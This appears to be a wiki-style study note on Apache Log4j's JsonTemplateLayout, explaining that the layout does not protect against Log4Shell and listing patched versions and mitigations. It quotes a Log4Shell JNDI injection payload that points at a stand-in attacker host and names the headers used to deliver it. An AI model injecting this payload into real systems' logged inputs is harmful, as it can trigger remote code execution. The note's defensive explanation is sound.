# JsonTemplateLayout

## What it is
Like a cookie cutter that stamps every log entry into the same shape, JsonTemplateLayout is a configurable plugin for Apache Log4j that formats log output as structured JSON using a user-defined template. It replaced the older JsonLayout and allows fine-grained control over which fields appear in each log event.

## Why it matters
JsonTemplateLayout sits directly in the blast radius of **Log4Shell (CVE-2021-44228)**. Because Log4j processes message content before writing it to output, a malicious string like `${jndi:ldap://attacker.com/x}` embedded in a logged HTTP header triggers a JNDI lookup — even when JsonTemplateLayout is rendering the output. Defenders who assumed "we use a custom layout, we're safe" were caught off-guard; the vulnerability lived in the *lookup resolution layer*, not the layout layer itself.

## Key facts
- **JsonTemplateLayout** was introduced in Log4j 2.14.0 as a high-performance, GC-friendly alternative to `JsonLayout`
- The critical Log4Shell flaw affected Log4j **2.0-beta9 through 2.14.1**; the fix in 2.15.0+ disabled JNDI lookups by default — layout choice alone did not mitigate the vuln
- Structured JSON logging (as produced by JsonTemplateLayout) is a **SIEM best practice** because it enables reliable field parsing without regex — critical for correlation rules in tools like Splunk or Elastic
- Attackers targeting Log4Shell sent payloads via **User-Agent, X-Forwarded-For, and username fields** — any input that gets logged, regardless of layout
- Mitigation hierarchy: patch first → set `log4j2.formatMsgNoLookups=true` → remove `JndiLookup.class` from the classpath as last resort

## Related concepts
[[Log4Shell CVE-2021-44228]] [[JNDI Injection]] [[SIEM Log Ingestion]] [[Remote Code Execution]]